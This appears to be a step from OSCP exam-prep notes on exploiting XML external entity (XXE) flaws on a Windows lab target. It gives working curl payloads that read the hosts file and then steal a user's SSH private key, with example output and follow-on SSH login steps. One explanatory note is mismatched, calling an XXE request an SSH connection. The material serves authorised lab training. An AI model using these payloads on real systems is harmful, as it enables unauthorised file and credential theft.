# Windows - XXE

**Step 24 of 50 · Windows**

*Test whether an XML-accepting endpoint reflects external entity content, then read files off the server.*

## Run this

First confirm reflection with a safe value:

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -i -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?><order><quantity>1</quantity><item>TESTVALUE</item><address>test</address></order>' \
  http://$BoxIP/process.php
```

If `TESTVALUE` echoes back in the response, inject an external entity against a safe file:

> **Why:** This SSH connection tests the recovered credential or reaches a legacy daemon using the compatibility options it requires.
```bash
curl -i -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
  http://$BoxIP/process.php
```

If the hosts file returns, escalate to the target file (SSH key if username is known):

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -b $BoxDir/cookies.txt \
  -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///C:/Users/$Username/.ssh/id_rsa">
]>
<order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
  http://$BoxIP/process.php | \
  awk '/BEGIN OPENSSH/,/END OPENSSH/' > $BoxDir/loot/${Username}_id_rsa

sed -i 's/Your order for //' $BoxDir/loot/${Username}_id_rsa
chmod 600 $BoxDir/loot/${Username}_id_rsa
ssh-keygen -y -f $BoxDir/loot/${Username}_id_rsa
```

## Example output

Reflection confirmed (safe test):

```
HTTP/1.1 200 OK
Your order for TESTVALUE has been processed
```

XXE hosts file read (external entities enabled):

```
Your order for # Copyright (c) 1993-2009 Microsoft Corp.
127.0.0.1  localhost
...
```

SSH key extracted and verified:

```
$ ssh-keygen -y -f loot/username_id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAA... username@hostname
```

## What did you get?

- [ ] TESTVALUE did not reflect → **XXE is not the path — go to Step 26 · [[Windows - Exploit Search]]**
- [ ] Hosts file returned → **Identify a target file: SSH key at `C:\Users\$Username\.ssh\id_rsa`, or config files like `web.config`**
- [ ] SSH key extracted and `ssh-keygen -y` succeeds → **`ssh -i $BoxDir/loot/${Username}_id_rsa $Username@$BoxIP` then go to Step 27 · [[Windows - Shell Received]]**
- [ ] A config file with cleartext credentials is found → **Validate credentials and go to Step 27 · [[Windows - Shell Received]]**
- [ ] Hosts file returned but SSH key path fails → **Try other paths: `C:\inetpub\wwwroot\web.config`, `C:\xampp\htdocs\config.php`**
- [ ] Reflection works but entity returns nothing → **Entity loading is disabled — go to Step 26 · [[Windows - Exploit Search]]**

## Notes

The XML element, endpoint path, and field name all vary by app. Identify the reflection point from the page source before writing the payload. Check HTML comments and JS source for usernames — that's the target path for SSH key extraction.

Always test with the hosts file first. It always exists and the content is recognisable. If that fails, external entity loading is off and there is no XXE.

## Gotcha

> [!warning] 💡
> The response wrapper text ("Your order for…") may land on the same line as `-----BEGIN OPENSSH`. Use `awk '/BEGIN OPENSSH/,/END OPENSSH/'` to extract cleanly, then strip any prefix with `sed`, then verify with `ssh-keygen -y`. A key that fails `-y` is corrupted and will not work.

> [!warning] 💡
> PHP 7.x enables external entity loading by default. PHP 8.0+ disables it. Old libxml2 = assume XXE is possible until proven otherwise.
## Seen in
- *(no write-up yet)*

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
